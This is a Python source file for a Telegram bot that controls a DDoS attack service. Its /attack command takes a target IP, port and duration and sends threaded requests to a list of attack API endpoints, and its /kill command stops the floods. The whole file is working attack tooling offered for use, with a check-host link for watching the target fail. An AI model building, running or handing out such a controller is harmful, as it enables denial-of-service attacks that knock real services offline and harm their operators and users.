from telegram.ext import Updater, CommandHandler, Filters
import requests
import threading
group_id = id_group
admin_id = id_admin
api = [
    "api1",
    "api2",
    "api3",
    "api4",
]
def start(update, context):
    update.message.reply_text("👋Hello User\n➤Use /attack to send attack\n➤Use /kill to stop attack")
def send_request(url):
    requests.get(url)
def kill(update, context):
    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
        return
    for url in api:
        threading.Thread(target=send_request, args=(f"http://{url}/action=kill",)).start()
    print(f"Kill All DDoS Process")
    update.message.reply_text(f"✅Kill All DDoS Process Success")
def attack(update, context):
    if update.message.chat_id != admin_id and update.message.chat_id != group_id:
        return
    args = context.args
    if len(args) != 3:
        update.message.reply_text("Usage: /attack ip port time")
        return

    ip, port, time = args

    for url in api:
        threading.Thread(target=send_request, args=(f"http://{url}/?ip={ip}&port={port}&thread=20&time={time}",)).start()

    print(f"Attack {ip}:{port} in {time} second")
    update.message.reply_text(f"✅DDoS Attack Sent Success\n  ┏➤IP: {ip}\n  ┣➤Port: {port}\n  ┗➤Time: {time}s\n⚠Check: https://check-host.net/check-ping?host={ip}\n⛔️Click To Stop Attack: /kill")
def main():
    updater = Updater("TOKEN_BOT_TELEGRAM", use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("kill", kill, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
    dp.add_handler(CommandHandler("attack", attack, Filters.chat(chat_id=group_id) | Filters.user(user_id=admin_id)))
    updater.start_polling()
    updater.idle()
if __name__ == "__main__":
    main()
